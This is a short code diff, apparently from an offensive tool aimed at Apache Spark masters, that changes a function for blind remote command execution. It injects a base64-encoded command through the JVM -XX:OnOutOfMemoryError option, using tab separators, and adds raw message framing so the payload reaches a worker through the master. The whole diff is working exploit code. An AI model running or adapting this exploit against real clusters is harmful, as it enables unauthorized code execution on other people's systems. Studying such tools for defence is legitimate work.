@@ -96,7 +96,7 @@ def blindCommandExec(sClient, binPath, cmdFormatted, maxMem):
     )
 
     whine("Executing command on a random worker", "info")
-    cmd = "-XX:OnOutOfMemoryError=echo${IFS}%s${IFS}|base64${IFS}-d|%s" % (
+    cmd = "-XX:OnOutOfMemoryError=echo\t%s\t|base64\t-d|%s" % (
         cmdFormatted.decode("utf-8"),
         binPath,
     )
@@ -117,13 +117,16 @@ def blindCommandExec(sClient, binPath, cmdFormatted, maxMem):
         + sClient.username.encode("utf-8")
         + holder[1747:]
     )
-    ret = sClient.sendRawMessage(payload)
-    if ret:
+    payloadSize = struct.pack(">I", len(payload))
+    payloadSize13 = struct.pack(">I", len(payload) + 13)
+    nonce = b"\x00\x00\x00\x00" + payloadSize13 + b"\x09" + payloadSize
+
+    resp = sClient.sendRawMessage(nonce, payload)
+    if not resp is None and "RegisteredApplication" in resp.decode("utf-8", "ignore"):
         whine("Positive response from the Master", "good")
         whine(
             "If cmd failed, adjust the -m param to make sure to case an out of memory error",
             "info",
         )
-
     else:
         whine("Something went wrong", "err")
